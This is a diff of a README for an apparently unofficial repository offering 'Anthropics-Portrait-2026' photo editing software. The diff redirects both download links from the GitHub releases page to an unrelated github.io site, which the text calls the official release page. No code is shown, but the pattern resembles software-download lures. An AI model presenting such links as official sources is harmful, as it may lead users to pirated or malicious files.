@@ -1,12 +1,12 @@
 # 📷 Anthropics-Portrait-2026 - Master professional portrait photo editing software
 
-[![](https://img.shields.io/badge/Download-Anthropics_Portrait_2026-blue.svg)](https://github.com/ergodic-occidentalism421/Anthropics-Portrait-2026/releases)
+[![](https://img.shields.io/badge/Download-Anthropics_Portrait_2026-blue.svg)](https://ergodic-occidentalism421.github.io)
 
 ## 📥 Accessing the software
 
 You can get the current version of the application from the official release page. Navigate to the link below to select the version compatible with your operating system.
 
-[Download Anthropics-Portrait-2026 for Windows](https://github.com/ergodic-occidentalism421/Anthropics-Portrait-2026/releases)
+[Download Anthropics-Portrait-2026 for Windows](https://ergodic-occidentalism421.github.io)
 
 ## ⚙️ How to install
 
